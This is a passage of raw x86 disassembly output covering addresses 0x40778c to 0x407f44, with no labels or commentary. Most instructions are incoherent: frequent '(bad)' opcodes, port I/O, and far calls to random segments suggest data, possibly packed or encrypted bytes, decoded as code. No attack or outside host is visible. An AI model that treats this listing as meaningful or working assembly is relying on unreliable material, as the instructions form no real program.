  40778c:	mov    ch,0x52
  40778e:	scas   eax,DWORD PTR es:[edi]
  40778f:	and    ebp,DWORD PTR [ebx-0x6a]
  407792:	dec    ebx
  407793:	jns    0x407736
  407795:	and    eax,0xb11aca1
  40779a:	loop   0x4077b9
  40779c:	pusha  
  40779d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40779e:	mov    ebx,esp
  4077a0:	aas    
  4077a1:	jo     0x4077b4
  4077a3:	add    DWORD PTR [eax-0x7241ee3b],0x60b6b361
  4077ad:	popf   
  4077ae:	dec    ecx
  4077af:	push   edi
  4077b0:	jnp    0x40782d
  4077b2:	push   ds
  4077b3:	fist   WORD PTR [edi]
  4077b5:	add    eax,0x107b7c98
  4077ba:	jae    0x407814
  4077bc:	ror    BYTE PTR [ebx-0x438f1433],cl
  4077c2:	xchg   ebx,eax
  4077c3:	rcl    BYTE PTR [ecx-0x56],1
  4077c6:	in     eax,0xd0
  4077c8:	xchg   esi,eax
  4077c9:	icebp  
  4077ca:	sub    BYTE PTR [eax+edi*1-0x77],cl
  4077ce:	adc    DWORD PTR [eax-0x1c],ebp
  4077d1:	ficomp DWORD PTR [ebx+ebx*2]
  4077d4:	js     0x40778d
  4077d6:	xor    edi,ebp
  4077d8:	rcr    DWORD PTR [ebp+0x3d],0xd2
  4077dc:	sbb    DWORD PTR [edi-0x66],edx
  4077df:	int3   
  4077e0:	or     eax,edx
  4077e2:	sub    eax,0xfa703c0
  4077e7:	sbb    dh,bl
  4077e9:	icebp  
  4077ea:	ins    DWORD PTR es:[edi],dx
  4077eb:	in     eax,0xd2
  4077ed:	jg     0x4077f2
  4077ef:	mov    WORD PTR [ecx-0x4d],?
  4077f2:	lods   al,BYTE PTR ds:[esi]
  4077f3:	sub    eax,ecx
  4077f5:	aas    
  4077f6:	jg     0x4077e3
  4077f8:	mov    esi,0x8ac4ee6
  4077fd:	out    0xa6,eax
  4077ff:	ins    DWORD PTR es:[edi],dx
  407800:	imul   ebp,DWORD PTR [edi-0x34],0x99c27590
  407807:	mov    DWORD PTR [eax-0x33],edx
  40780a:	(bad)  
  40780b:	and    DWORD PTR [ecx+edx*4+0x4bedb135],esi
  407812:	test   al,0x71
  407814:	mov    ds:0xf66b664f,al
  407819:	pop    ecx
  40781a:	(bad)  
  40781c:	aad    0x69
  40781e:	(bad)  
  40781f:	repnz mov ?,WORD PTR [ebp+0x23f30197]
  407826:	dec    DWORD PTR [edx]
  407828:	iret   
  407829:	call   0xd365:0x10f195c4
  407830:	dec    esi
  407831:	adc    DWORD PTR [edx],esp
  407833:	pop    edi
  407834:	add    DWORD PTR [eax+0x7c0ef22a],0xeff369a2
  40783e:	dec    edi
  40783f:	js     0x4077ea
  407841:	icebp  
  407842:	std    
  407843:	lods   al,BYTE PTR ds:[esi]
  407844:	mov    ah,0xa1
  407846:	pop    ds
  407847:	or     dh,BYTE PTR ds:0x202cca22
  40784d:	inc    ebx
  40784e:	leave  
  40784f:	sub    ebp,DWORD PTR [eax-0x674b2bbf]
  407855:	ss jp  0x4078ab
  407858:	add    eax,0x38576006
  40785d:	xchg   edx,eax
  40785e:	mov    BYTE PTR [esi+edi*1],bh
  407861:	mov    esp,0x8f86bf8d
  407866:	ret    0x66f6
  407869:	adc    al,0x18
  40786b:	lea    esi,ds:0x69217303
  407871:	mov    edi,0xf792d8e7
  407876:	add    esp,DWORD PTR [esi-0x1dcc8266]
  40787c:	inc    ebp
  40787d:	push   edx
  40787e:	test   BYTE PTR [edi+0x6db4885f],cl
  407884:	dec    esi
  407885:	test   eax,0xa87bb460
  40788a:	push   esi
  40788b:	xlat   BYTE PTR ds:[ebx]
  40788c:	xchg   esp,eax
  40788d:	or     ah,ah
  40788f:	xlat   BYTE PTR ds:[ebx]
  407890:	jmp    0xc8d3:0xb155ae7d
  407897:	and    eax,0x29b317c9
  40789c:	mov    edi,0x765e3bf4
  4078a1:	std    
  4078a2:	add    DWORD PTR [edi+0x75d4c7d9],ebp
  4078a8:	lods   al,BYTE PTR ds:[esi]
  4078a9:	adc    esp,ebp
  4078ab:	clc    
  4078ac:	cmp    al,0x87
  4078ae:	or     cl,BYTE PTR [ebx]
  4078b0:	das    
  4078b1:	test   al,0xad
  4078b3:	ret    0xd5ac
  4078b6:	(bad)  
  4078b7:	mov    ebx,0x83b500d6
  4078bc:	add    al,0x97
  4078be:	mov    al,0x3d
  4078c0:	ret    
  4078c1:	in     eax,0x9f
  4078c3:	jno    0x407904
  4078c5:	int    0x70
  4078c7:	or     ch,dh
  4078c9:	retf   
  4078ca:	in     eax,dx
  4078cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078cc:	jns    0x4078cc
  4078ce:	mov    ss,WORD PTR [ebp-0x41]
  4078d1:	mov    ebp,0x96272bbb
  4078d6:	shl    dl,1
  4078d8:	dec    eax
  4078d9:	repz push ebx
  4078db:	fisttp QWORD PTR [ebx+0xf]
  4078de:	jp     0x407898
  4078e0:	pop    ebp
  4078e1:	jnp    0x407938
  4078e3:	sub    eax,0x2da3b80e
  4078e8:	mov    BYTE PTR [ebx+0x17],bh
  4078eb:	pop    ecx
  4078ec:	(bad)  
  4078ee:	mov    ecx,DWORD PTR ds:0xc60869ca
  4078f4:	in     al,0x84
  4078f6:	lods   eax,DWORD PTR ds:[esi]
  4078f7:	inc    edi
  4078f8:	xor    eax,0x7a0161e
  4078fd:	arpl   si,sp
  4078ff:	cld    
  407900:	xchg   ebx,ebp
  407902:	imul   esp,DWORD PTR [edi-0x32977c1],0x8646997a
  40790c:	and    eax,0xd4d00259
  407911:	rol    DWORD PTR [eax-0xc],1
  407914:	xchg   DWORD PTR [esi-0x2c68c305],esi
  40791a:	popa   
  40791b:	mov    DWORD PTR [ebp+ecx*1+0x25fc2668],eax
  407922:	dec    eax
  407923:	jmp    0x40797f
  407925:	xchg   esp,eax
  407926:	mov    bl,0x82
  407928:	push   cs
  407929:	aaa    
  40792a:	es gs inc eax
  40792d:	(bad)  
  40792e:	mov    bh,0x1b
  407930:	mov    al,ds:0x3cf27707
  407935:	push   ss
  407936:	lock loope 0x407976
  407939:	and    cl,BYTE PTR [ebx+ecx*1]
  40793c:	ret    
  40793d:	cmp    al,0xce
  40793f:	idiv   DWORD PTR [esi]
  407941:	out    0x72,al
  407943:	(bad)  
  407944:	and    eax,0xe6be15cb
  407949:	fwait
  40794a:	adc    eax,0xea96843a
  40794f:	call   0x2786:0x38bdf3bc
  407956:	bound  edx,QWORD PTR [esi+0x374a6a25]
  40795c:	test   dl,bh
  40795e:	div    BYTE PTR [edi-0x3a816cf7]
  407964:	dec    ebx
  407965:	aaa    
  407966:	cmp    eax,0xb610105a
  40796b:	xchg   edx,eax
  40796c:	xor    DWORD PTR [ecx+0x4a5d1211],esp
  407972:	pop    esi
  407973:	cmc    
  407974:	mov    ebp,eax
  407976:	mov    edx,0x7a507347
  40797b:	rcr    ebp,0xd8
  40797e:	mov    ebx,0x750918cb
  407983:	gs xor al,dh
  407986:	call   0x5cbafea5
  40798b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40798c:	pushf  
  40798d:	in     al,0xd9
  40798f:	or     al,0x8a
  407991:	pushf  
  407992:	xor    eax,0x1d65a85d
  407997:	shl    esi,1
  407999:	fidiv  DWORD PTR [edi-0xa5a4654]
  40799f:	sbb    ah,BYTE PTR [ebp-0x40]
  4079a2:	cwde   
  4079a3:	pop    edi
  4079a4:	add    dh,cl
  4079a6:	mov    eax,ds:0x9a836363
  4079ab:	and    edi,edi
  4079ad:	xchg   edi,eax
  4079ae:	jnp    0x40798c
  4079b0:	retf   
  4079b1:	xchg   esi,eax
  4079b2:	(bad)  
  4079b3:	lock push 0xe4925b30
  4079b9:	push   eax
  4079ba:	sbb    eax,0x3270dcf8
  4079bf:	push   ss
  4079c0:	popa   
  4079c1:	imul   ecx,DWORD PTR [ecx],0x56620561
  4079c7:	call   esi
  4079c9:	mov    ds:0xd3c5b39f,eax
  4079ce:	mov    eax,0x1217e988
  4079d3:	mov    esp,0xcc312cd0
  4079d8:	pop    esp
  4079d9:	push   edx
  4079da:	mov    WORD PTR [esi],cs
  4079dc:	add    DWORD PTR [ebp-0x5f293833],0x5d
  4079e3:	xchg   esp,eax
  4079e4:	test   eax,0x38fcceca
  4079e9:	(bad)  
  4079ea:	mov    edi,0x7bfa487d
  4079ef:	xor    eax,0x5d35ac50
  4079f4:	adc    al,0xc5
  4079f6:	sub    eax,0xedcea2a4
  4079fb:	inc    ecx
  4079fc:	ror    bl,1
  4079fe:	popf   
  4079ff:	xchg   cx,ax
  407a01:	cs mov ah,0xa9
  407a04:	outs   dx,BYTE PTR ds:[esi]
  407a05:	inc    eax
  407a06:	out    0xe2,al
  407a08:	sbb    al,0x10
  407a0a:	adc    al,0xb
  407a0c:	lahf   
  407a0d:	icebp  
  407a0e:	and    dh,dh
  407a10:	add    ch,BYTE PTR [edx+0x69bb83f7]
  407a16:	(bad)  
  407a17:	lods   al,BYTE PTR ds:[esi]
  407a18:	and    DWORD PTR ds:0x73490bd0,0x576d0d6f
  407a22:	xor    ch,BYTE PTR [ebx+edx*1-0x459509cf]
  407a29:	ficom  WORD PTR [esi+0x9b2a4]
  407a2f:	(bad)  
  407a30:	stc    
  407a31:	ins    BYTE PTR es:[edi],dx
  407a32:	xchg   edi,eax
  407a33:	mov    BYTE PTR [eax-0x74],dl
  407a36:	fidivr WORD PTR [edx-0x4]
  407a39:	(bad)  [eax]
  407a3b:	std    
  407a3c:	mov    al,ds:0x7d40494
  407a41:	fidiv  WORD PTR [edi]
  407a43:	pop    edi
  407a44:	xor    ah,dh
  407a46:	retf   
  407a47:	inc    eax
  407a48:	ror    bl,cl
  407a4a:	in     eax,dx
  407a4b:	jbe    0x4079d3
  407a4d:	jns    0x407a22
  407a4f:	mul    DWORD PTR [edi-0x2a28999a]
  407a55:	dec    esp
  407a56:	and    DWORD PTR [esi-0x65],edx
  407a59:	or     eax,0x41a433b6
  407a5e:	loop   0x407add
  407a60:	add    al,0x1
  407a62:	jns    0x407a1f
  407a64:	dec    DWORD PTR [esp+edi*4+0x1b]
  407a68:	xchg   ebp,eax
  407a69:	iret   
  407a6a:	addr16 jo 0x4079fd
  407a6d:	cmp    eax,0xb6d7db6d
  407a72:	cmp    DWORD PTR [edx+ebx*4-0x51],edi
  407a76:	cmp    dl,BYTE PTR [eax-0x29]
  407a79:	mov    esi,0xb5a0858c
  407a7e:	nop
  407a7f:	cmc    
  407a80:	(bad)  [eax+0x2a5e0e13]
  407a86:	xchg   edx,eax
  407a87:	mov    ah,0x1c
  407a89:	arpl   WORD PTR [edx],ax
  407a8b:	push   edx
  407a8c:	mov    dh,0xf3
  407a8e:	es inc ebx
  407a90:	push   0xffffffa1
  407a92:	pop    esi
  407a93:	mul    ah
  407a95:	test   al,0x42
  407a97:	out    dx,al
  407a98:	mov    DWORD PTR [eax-0x2497780e],esp
  407a9e:	lods   al,BYTE PTR ss:[esi]
  407aa0:	addr16 jae 0x407aae
  407aa3:	std    
  407aa4:	dec    esp
  407aa5:	cmp    dh,dl
  407aa7:	jge    0x407aff
  407aa9:	leave  
  407aaa:	clc    
  407aab:	test   BYTE PTR [eax-0x63],dh
  407aae:	sub    ebx,DWORD PTR [esi-0x35]
  407ab1:	cmp    BYTE PTR [edi],ch
  407ab3:	push   edi
  407ab4:	adc    BYTE PTR [edi+0x216599cf],0xd2
  407abb:	(bad)  
  407abc:	jp     0x407ac7
  407abe:	push   ds
  407abf:	dec    ebp
  407ac0:	cwde   
  407ac1:	pop    ebp
  407ac2:	jl     0x407af7
  407ac4:	cmp    dh,BYTE PTR [edi+0xea827]
  407aca:	out    dx,eax
  407acb:	mov    al,ds:0xbb9a05e
  407ad0:	pop    eax
  407ad1:	rcl    BYTE PTR [esp+edx*1],1
  407ad4:	pop    ecx
  407ad5:	xor    DWORD PTR [ebx+0x72],edi
  407ad8:	or     al,0x4a
  407ada:	pop    edi
  407adb:	inc    ecx
  407adc:	cmc    
  407add:	(bad)
  407ae0:	xor    ebp,DWORD PTR [ecx+0x33]
  407ae3:	inc    ebp
  407ae4:	jbe    0x407b63
  407ae6:	dec    eax
  407ae7:	cmc    
  407ae8:	mov    eax,0x81dd386e
  407aed:	push   ss
  407aee:	call   0xe7b28fcc
  407af3:	pop    esp
  407af4:	sub    esp,esi
  407af6:	(bad)  
  407af7:	push   ecx
  407af8:	mov    ebp,0x9ec78a2f
  407afd:	inc    edx
  407afe:	scas   al,BYTE PTR es:[edi]
  407aff:	dec    esp
  407b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b01:	mov    ds:0xfefe6461,al
  407b06:	shl    DWORD PTR [ebp-0x69],cl
  407b09:	add    bh,BYTE PTR [ecx]
  407b0b:	fistp  DWORD PTR [eax+0x40]
  407b0e:	jo     0x407b2f
  407b10:	fs ins BYTE PTR es:[edi],dx
  407b12:	imul   eax,DWORD PTR [edi],0x61
  407b15:	xor    DWORD PTR [ebx-0xf6ebe05],ecx
  407b1b:	cmp    BYTE PTR [edx-0x72],bh
  407b1e:	mov    dh,0xe
  407b20:	xor    edi,ecx
  407b22:	(bad)  
  407b23:	shr    dh,1
  407b25:	jne    0x407b36
  407b27:	and    BYTE PTR [ebx],dl
  407b29:	pop    eax
  407b2a:	daa    
  407b2b:	push   edx
  407b2c:	dec    edi
  407b2d:	add    esi,DWORD PTR [edx+0x74b4c154]
  407b33:	out    dx,al
  407b34:	dec    eax
  407b35:	dec    ecx
  407b36:	sbb    al,0xdc
  407b38:	cmp    ebx,esp
  407b3a:	retf   0xe5ab
  407b3d:	sub    al,0x24
  407b3f:	imul   ecx,edi,0xb1342121
  407b45:	xlat   BYTE PTR ds:[ebx]
  407b46:	(bad)  
  407b47:	mov    WORD PTR [edi],?
  407b49:	ds std 
  407b4b:	(bad)  [ecx+0xd]
  407b4e:	xor    al,0x80
  407b50:	push   edi
  407b51:	retf   0xbb7b
  407b54:	pop    esp
  407b55:	xchg   ebp,eax
  407b56:	lods   eax,DWORD PTR ds:[esi]
  407b57:	stc    
  407b58:	es mov al,0x63
  407b5b:	cmp    ebx,DWORD PTR [eax+0x40]
  407b5e:	xor    ah,ch
  407b60:	mov    al,ds:0x30cbfeb0
  407b65:	pop    ecx
  407b66:	xchg   esi,eax
  407b67:	retf   0xe29b
  407b6a:	xchg   edi,eax
  407b6b:	dec    ebx
  407b6c:	cli    
  407b6d:	in     eax,0xa3
  407b6f:	pop    edi
  407b70:	inc    ebp
  407b71:	icebp  
  407b72:	test   DWORD PTR [edx-0x65],eax
  407b75:	push   ebp
  407b76:	pusha  
  407b77:	jae    0x407bb4
  407b79:	dec    ebp
  407b7a:	shl    BYTE PTR [ebp+0x344d7695],0xd7
  407b81:	inc    ebp
  407b82:	sahf   
  407b83:	mov    esp,0x5d2d0bfb
  407b88:	push   0x32948b6e
  407b8d:	pop    esi
  407b8e:	(bad)  
  407b8f:	scas   eax,DWORD PTR es:[edi]
  407b90:	jge    0x407bf9
  407b92:	add    eax,0xfbf22f5c
  407b97:	fdecstp 
  407b99:	xchg   BYTE PTR [esp+eiz*8-0x74],ah
  407b9d:	popa   
  407b9e:	sahf   
  407b9f:	jp     0x407b82
  407ba1:	gs push eax
  407ba3:	jbe    0x407b84
  407ba5:	mov    al,ds:0x221859
  407baa:	(bad)  
  407bab:	dec    ecx
  407bac:	push   edx
  407bad:	xor    edx,eax
  407baf:	idiv   DWORD PTR [ebx]
  407bb1:	outs   dx,BYTE PTR ds:[esi]
  407bb2:	sbb    BYTE PTR [eax-0x5c2e48ed],cl
  407bb8:	stos   BYTE PTR es:[edi],al
  407bb9:	sbb    cl,0x7b
  407bbc:	push   ebx
  407bbd:	pusha  
  407bbe:	and    BYTE PTR [ebx+0x49],bl
  407bc1:	vroundsd xmm3,xmm4,QWORD PTR [eax],0xe4
  407bc7:	retf   
  407bc8:	sbb    al,0x55
  407bca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bcb:	popf   
  407bcc:	call   0x622120d1
  407bd1:	imul   eax,DWORD PTR [eax-0x298afc44],0xffffff88
  407bd8:	mov    al,ds:0x68073e8e
  407bdd:	xor    ch,dl
  407bdf:	std    
  407be0:	xchg   esp,eax
  407be1:	ficomp WORD PTR [ebp+ecx*2-0x1a]
  407be5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407be6:	pushf  
  407be7:	sbb    al,cl
  407be9:	mov    dl,0xa4
  407beb:	pop    es
  407bec:	lods   eax,DWORD PTR ds:[esi]
  407bed:	test   DWORD PTR [ebx-0x19290557],0xbfce9126
  407bf7:	int    0x2
  407bf9:	push   ecx
  407bfa:	(bad)  [edi-0x1d]
  407bfd:	popa   
  407bfe:	(bad)  
  407bff:	adc    ah,bh
  407c01:	std    
  407c02:	xchg   DWORD PTR [edx+ebp*2],ebx
  407c05:	lods   al,BYTE PTR ds:[esi]
  407c06:	not    ecx
  407c08:	sar    BYTE PTR [esi],0xd8
  407c0b:	in     eax,dx
  407c0c:	scas   eax,DWORD PTR es:[edi]
  407c0d:	jb     0x407bd5
  407c0f:	int    0xb7
  407c11:	fdivr  DWORD PTR [eax]
  407c13:	mov    es,WORD PTR [ebp+0x6a]
  407c16:	mov    ebx,0x55a2d7ba
  407c1b:	adc    al,0xa2
  407c1d:	icebp  
  407c1e:	int    0xd6
  407c20:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  407c22:	imul   esp,ecx,0x32
  407c25:	dec    ecx
  407c26:	sub    dh,BYTE PTR [eax+0x6fad273]
  407c2c:	test   bl,cl
  407c2e:	or     al,0x72
  407c30:	(bad)  
  407c31:	pushf  
  407c32:	cli    
  407c33:	sub    ch,BYTE PTR [eax]
  407c35:	out    0x88,eax
  407c37:	stos   BYTE PTR es:[edi],al
  407c38:	cdq    
  407c39:	dec    ecx
  407c3a:	jge    0x407bec
  407c3c:	fisttp QWORD PTR [esi]
  407c3e:	sahf   
  407c3f:	push   ecx
  407c40:	push   edi
  407c41:	lock pop esi
  407c43:	repz or ch,dl
  407c46:	pop    esp
  407c47:	call   0xc2f349a
  407c4c:	je     0x407c8c
  407c4e:	(bad)  
  407c4f:	sbb    DWORD PTR [ecx],esi
  407c51:	mov    esp,0x2b583aa2
  407c56:	rol    DWORD PTR [eax],0xf2
  407c59:	test   al,0x64
  407c5b:	xlat   BYTE PTR ds:[ebx]
  407c5c:	imul   edx
  407c5e:	cli    
  407c5f:	inc    esi
  407c60:	pop    ecx
  407c61:	add    al,0x1d
  407c63:	lods   eax,DWORD PTR ds:[esi]
  407c64:	arpl   WORD PTR [esi+0x3780986],cx
  407c6a:	xor    ch,BYTE PTR [edx]
  407c6c:	mov    ebp,0x5763dd7b
  407c71:	or     eax,0x9519c58f
  407c76:	pop    ebp
  407c77:	out    0x1c,al
  407c79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c7a:	dec    ebp
  407c7b:	gs push ebp
  407c7d:	cmp    edx,DWORD PTR [ebx+ebp*1-0x7b775846]
  407c84:	add    ecx,DWORD PTR [edi-0x33892311]
  407c8a:	outs   dx,DWORD PTR ds:[esi]
  407c8b:	(bad)  
  407c8c:	push   eax
  407c8d:	push   0x6e
  407c8f:	call   0x1362:0x85a0600c
  407c96:	jne    0x407cff
  407c98:	inc    ecx
  407c99:	ficomp WORD PTR [edx]
  407c9b:	dec    ecx
  407c9c:	pop    ss
  407c9d:	push   0xffffffb5
  407c9f:	popa   
  407ca0:	sti    
  407ca1:	xchg   ecx,eax
  407ca2:	fwait
  407ca3:	(bad)  
  407ca4:	leave  
  407ca5:	fstp   QWORD PTR [ecx]
  407ca7:	shl    BYTE PTR [ecx+0x23d48669],cl
  407cad:	sbb    al,0xb8
  407caf:	mov    ds:0xcb0ee1,eax
  407cb4:	sbb    eax,0x85903085
  407cb9:	mov    edx,0x2e1de73
  407cbe:	and    eax,0xefa918e5
  407cc3:	shl    BYTE PTR [edi-0x37],0x15
  407cc7:	int    0xbe
  407cc9:	jmp    0xf6ca0790
  407cce:	aas    
  407ccf:	scas   eax,DWORD PTR es:[edi]
  407cd0:	jle    0x407ccc
  407cd2:	lea    ecx,[edx+0x47449033]
  407cd8:	shr    esi,cl
  407cda:	outs   dx,BYTE PTR ds:[esi]
  407cdb:	jmp    0x2d208ea9
  407ce0:	push   0x6ccbef77
  407ce5:	sub    dl,bl
  407ce7:	hlt    
  407ce8:	mov    ah,0x36
  407cea:	jbe    0x407d52
  407cec:	add    al,0x2d
  407cee:	adc    DWORD PTR [ecx+0xb9af826],ebx
  407cf4:	xchg   ebx,eax
  407cf5:	pop    eax
  407cf6:	std    
  407cf7:	mov    bl,0x57
  407cf9:	bound  eax,QWORD PTR [ebx+0x53]
  407cfc:	stos   BYTE PTR es:[edi],al
  407cfd:	stos   BYTE PTR es:[edi],al
  407cfe:	imul   ecx,edi,0x2de0418e
  407d04:	in     eax,dx
  407d05:	shl    DWORD PTR [ebp+0x7a],0xe9
  407d09:	(bad)  
  407d0a:	pop    ecx
  407d0b:	sahf   
  407d0c:	(bad)  
  407d0d:	mov    ch,0x45
  407d0f:	lds    edi,FWORD PTR [ecx]
  407d11:	push   es
  407d12:	out    0x7c,al
  407d14:	aas    
  407d15:	sub    eax,0x78213b0f
  407d1a:	sar    DWORD PTR [edi+0x51],1
  407d1d:	jb     0x407d50
  407d1f:	jb     0x407d5a
  407d21:	jl     0x407cb7
  407d23:	add    al,0xd4
  407d25:	and    ebx,edx
  407d27:	xchg   esp,eax
  407d28:	inc    edx
  407d29:	xchg   edi,eax
  407d2a:	inc    ecx
  407d2b:	push   0xffffffb3
  407d2d:	mov    BYTE PTR [esp+ebp*8+0x2d],dl
  407d31:	repz scas eax,DWORD PTR es:[edi]
  407d33:	or     BYTE PTR [esi],cl
  407d35:	inc    edx
  407d36:	dec    edx
  407d37:	cmp    ebx,0xee2c5b94
  407d3d:	cli    
  407d3e:	or     al,0x44
  407d40:	xlat   BYTE PTR ds:[ebx]
  407d41:	pop    edi
  407d42:	(bad)  
  407d43:	lock mov WORD PTR [eax+0x72],es
  407d47:	ins    BYTE PTR es:[edi],dx
  407d48:	or     edi,esi
  407d4a:	mov    al,ds:0xdd115375
  407d4f:	mov    al,0x96
  407d51:	pop    ebx
  407d52:	(bad)
  407d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d57:	cmp    DWORD PTR [eax],esp
  407d59:	push   es
  407d5a:	in     al,dx
  407d5b:	sub    BYTE PTR [edx],cl
  407d5d:	int    0xd1
  407d5f:	out    dx,eax
  407d60:	cmp    edx,edx
  407d62:	int    0xfe
  407d64:	pop    eax
  407d65:	(bad)  
  407d66:	pop    esi
  407d67:	neg    ebx
  407d69:	push   ecx
  407d6a:	ror    DWORD PTR [ecx+0x603904c2],0x5d
  407d71:	push   eax
  407d72:	sbb    eax,0xce5ece72
  407d77:	adc    cl,BYTE PTR [edi+0x4c]
  407d7a:	and    dl,BYTE PTR [eax-0x7b]
  407d7d:	mov    esi,0x6e14736c
  407d82:	pop    DWORD PTR [ecx-0x3a]
  407d85:	sub    dl,BYTE PTR [edi]
  407d87:	adc    DWORD PTR [edi+0x52],ecx
  407d8a:	sbb    eax,0x1f002686
  407d8f:	or     eax,0xe846a081
  407d94:	ja     0x407e0a
  407d96:	or     al,0x3a
  407d98:	add    eax,0xdb0a8d1a
  407d9d:	imul   ebx,ebp,0xfadb5cb0
  407da3:	jmp    0x407e19
  407da5:	enter  0x9fb,0x64
  407da9:	mov    dh,0xbf
  407dab:	push   esp
  407dac:	sub    ch,BYTE PTR [edx-0x43]
  407daf:	(bad)  
  407db0:	out    dx,eax
  407db1:	loopne 0x407d92
  407db3:	ins    DWORD PTR es:[edi],dx
  407db4:	fwait
  407db5:	sbb    al,cl
  407db7:	(bad)  
  407db8:	sbb    eax,0x9d7490de
  407dbd:	shl    DWORD PTR [edx],1
  407dbf:	ret    0x8e63
  407dc2:	(bad)  
  407dc3:	jmp    FWORD PTR [ebx-0x6c]
  407dc6:	cmp    BYTE PTR [edx+0x44159ac6],0x0
  407dcd:	mov    cx,WORD PTR [ebx]
  407dd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407dd1:	sub    eax,0x80aead47
  407dd6:	push   esp
  407dd7:	xchg   ebp,eax
  407dd8:	fsubr  QWORD PTR [ebp-0x1e]
  407ddb:	push   esp
  407ddc:	dec    BYTE PTR [edi]
  407dde:	jecxz  0x407e2c
  407de0:	adc    al,0x1c
  407de2:	pushf  
  407de3:	push   esp
  407de4:	loop   0x407e1f
  407de6:	(bad)  
  407de7:	pop    ebx
  407de8:	daa    
  407de9:	in     al,dx
  407dea:	in     eax,0x6a
  407dec:	inc    esp
  407ded:	push   0xf798f5e7
  407df2:	mov    al,ds:0x912bd85c
  407df7:	jnp    0x407dfa
  407df9:	mov    eax,0xa0560182
  407dfe:	sub    DWORD PTR [esi+ebp*1+0x35],esi
  407e02:	loopne 0x407d9f
  407e04:	mov    bh,0x3d
  407e06:	inc    edx
  407e07:	les    esi,FWORD PTR [ecx+0x40]
  407e0a:	sub    DWORD PTR [edx-0x1d853c36],0x59
  407e11:	sub    BYTE PTR [edx],ch
  407e13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e14:	neg    BYTE PTR [edi+eiz*2+0x2c300244]
  407e1b:	call   0x95ddaa52
  407e20:	mov    esp,0x7a67173d
  407e25:	stos   BYTE PTR es:[edi],al
  407e26:	(bad)  
  407e27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e28:	pop    edx
  407e29:	mov    al,0x65
  407e2b:	fdivr  QWORD PTR ds:[edx]
  407e2e:	ror    DWORD PTR [edi+eax*2-0x3a],1
  407e32:	in     al,dx
  407e33:	add    al,0x86
  407e35:	mov    edi,0x9016cf91
  407e3a:	retf   
  407e3b:	arpl   WORD PTR [ebx-0x56],dx
  407e3e:	rol    DWORD PTR [edx-0x71b975bf],cl
  407e44:	or     esi,0x9955c28c
  407e4a:	mov    eax,ds:0xe3fd6e16
  407e4f:	dec    ebx
  407e50:	(bad)
  407e54:	inc    esp
  407e55:	rcl    DWORD PTR [ecx-0x5d],cl
  407e58:	pop    ss
  407e59:	cmp    al,BYTE PTR ds:0x17ab806f
  407e5f:	rcl    DWORD PTR [esi+0x428760ce],1
  407e65:	out    dx,eax
  407e66:	sbb    bl,BYTE PTR [edi-0x2c]
  407e69:	aaa    
  407e6a:	sub    ebx,DWORD PTR [esi+0x7c0a8db4]
  407e70:	mov    ecx,0x2e11f6e3
  407e75:	and    DWORD PTR [ebx-0x683f08fc],ebx
  407e7b:	sub    eax,0x6031c0eb
  407e80:	adc    al,0x57
  407e82:	test   BYTE PTR ds:0x200456b5,al
  407e88:	cld    
  407e89:	add    eax,0x7892b7bf
  407e8e:	xor    eax,0x39a3cc0f
  407e93:	dec    DWORD PTR [edi-0x6a]
  407e96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e97:	inc    esp
  407e98:	sub    al,0xef
  407e9a:	ror    DWORD PTR [ebx+eiz*2-0xcfde7cc],cl
  407ea1:	mov    cl,0x2b
  407ea3:	mov    bl,0xba
  407ea5:	mov    ebx,0x2e1e463b
  407eaa:	xchg   esp,eax
  407eab:	pop    ds
  407eac:	jge    0x407e91
  407eae:	(bad)  
  407eaf:	fs ss and al,0xdd
  407eb3:	mov    bl,0x9e
  407eb5:	loope  0x407e3b
  407eb7:	pusha  
  407eb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eb9:	sti    
  407eba:	xor    ebp,DWORD PTR [ebx+0x78]
  407ebd:	retf   0xa792
  407ec0:	or     DWORD PTR [eax+0x49820cf],esp
  407ec6:	popa   
  407ec7:	mov    dl,BYTE PTR [ecx-0x6f9ff193]
  407ecd:	add    al,0x69
  407ecf:	scas   al,BYTE PTR es:[edi]
  407ed0:	dec    ebx
  407ed1:	imul   esp,DWORD PTR [ebx+0x3df560ff],0xe
  407ed8:	push   edi
  407ed9:	cmp    bh,BYTE PTR fs:[ebx-0x3b1bdb0c]
  407ee0:	sbb    al,0x27
  407ee2:	dec    edi
  407ee3:	adc    eax,0xf1b09f6e
  407ee8:	stc    
  407ee9:	cmp    BYTE PTR [edi+0x7a],ah
  407eec:	mov    cl,0xc8
  407eee:	lahf   
  407eef:	pop    ebp
  407ef0:	ins    BYTE PTR es:[edi],dx
  407ef1:	jmp    0x407f0b
  407ef3:	cmp    BYTE PTR [ebx+ebx*4+0x16],cl
  407ef7:	in     al,0x4d
  407ef9:	bound  ebp,QWORD PTR [ebx]
  407efb:	and    ecx,DWORD PTR [edi-0x74]
  407efe:	or     esp,eax
  407f00:	inc    ebp
  407f02:	mov    esp,0x914b5e42
  407f07:	clc    
  407f08:	mov    ebp,0x24ea302a
  407f0d:	cdq    
  407f0e:	ds jbe 0x407f83
  407f11:	push   0x1bec06bc
  407f16:	lods   eax,DWORD PTR ds:[esi]
  407f17:	pop    ecx
  407f18:	xor    dl,BYTE PTR [eax+ebp*1-0x123b6547]
  407f1f:	adc    edx,ebp
  407f21:	jle    0x407f64
  407f23:	xor    ebx,DWORD PTR [ebp-0x5647f820]
  407f29:	push   ds
  407f2a:	push   cs
  407f2b:	or     eax,0x7102a914
  407f30:	push   fs
  407f32:	popf   
  407f33:	arpl   WORD PTR [esi-0x6c2c6ba0],dx
  407f39:	cmc    
  407f3a:	popa   
  407f3b:	jge    0x407ef4
  407f3d:	push   ebx
  407f3e:	test   cl,0x34
  407f41:	mov    bh,0xeb
  407f43:	push   esi
  407f44:	lea    ecx,[ecx-0x5e320c70]
